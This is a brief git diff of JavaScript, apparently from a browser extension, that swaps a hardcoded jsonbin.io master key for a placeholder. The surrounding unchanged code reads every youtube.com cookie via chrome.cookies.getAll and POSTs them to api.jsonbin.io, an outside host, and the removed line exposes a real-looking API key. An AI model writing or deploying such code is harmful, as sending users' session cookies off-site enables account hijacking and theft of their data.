@@ -10,7 +10,7 @@ chrome.cookies.getAll({url: 'https://www.youtube.com'},  (cookie) => {
     
     req.open("POST", "https://api.jsonbin.io/v3/b", true);
     req.setRequestHeader("Content-Type", "application/json");
-    req.setRequestHeader("X-Master-Key", "$2a$10$ZO303d1nhcR/rwHLF/LPGeyLU1F46YQPgCbVnAIZgaRzj0oR1S0ky");
+    req.setRequestHeader("X-Master-Key", "YOUR_KEY");
     req.send(cookies);
     });
 
